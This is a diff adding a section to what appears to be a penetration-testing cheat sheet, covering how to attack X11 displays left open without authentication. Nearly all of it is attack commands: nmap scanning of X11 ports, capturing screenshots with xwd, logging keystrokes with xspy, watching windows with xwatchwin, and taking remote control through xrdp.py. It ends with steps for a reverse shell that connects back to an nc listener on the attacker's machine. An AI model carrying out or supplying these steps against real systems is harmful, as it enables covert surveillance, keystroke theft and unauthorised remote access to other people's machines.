@@ -790,4 +790,32 @@ mount -t cifs //<target IP>/<share> /mnt/temp/ -o user=anonymous
 # Rstatd enabled
 
 rsysinfo <target IP>
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# X11 Unauthenticated Access
+
+- Enumeration
+nmap -Pn -n -T4 --open -p6000-6009 <targetIP>
+
+- Gather window info
+xwininfo -root -tree -display <targetIP:display #>
+
+- Capture screenshot
+xwd -root -screen -silent -display <targetIP:display #> > 1.xwd
+convert 1.xwd 1.png
+
+- Keylogger
+xspy -display <targetIP:display #>
+If Kali's version doesnot work, you may need to compile from source https://github.com/mnp/xspy
+
+- Remotely view
+xwatchwin <targetIP:display #> -w <ID>
+
+- Remote Desktop
+xrdp.py <targetIP:display #>
+
+- Reverse shell
+xrdp.py <targetIP:display #> –no-disp
+It will prompt a new control pane where we can see the R-shell option.
+nc -lvp 443
+Go back to the window and enter the attackerIP:port, then select R-Shell.
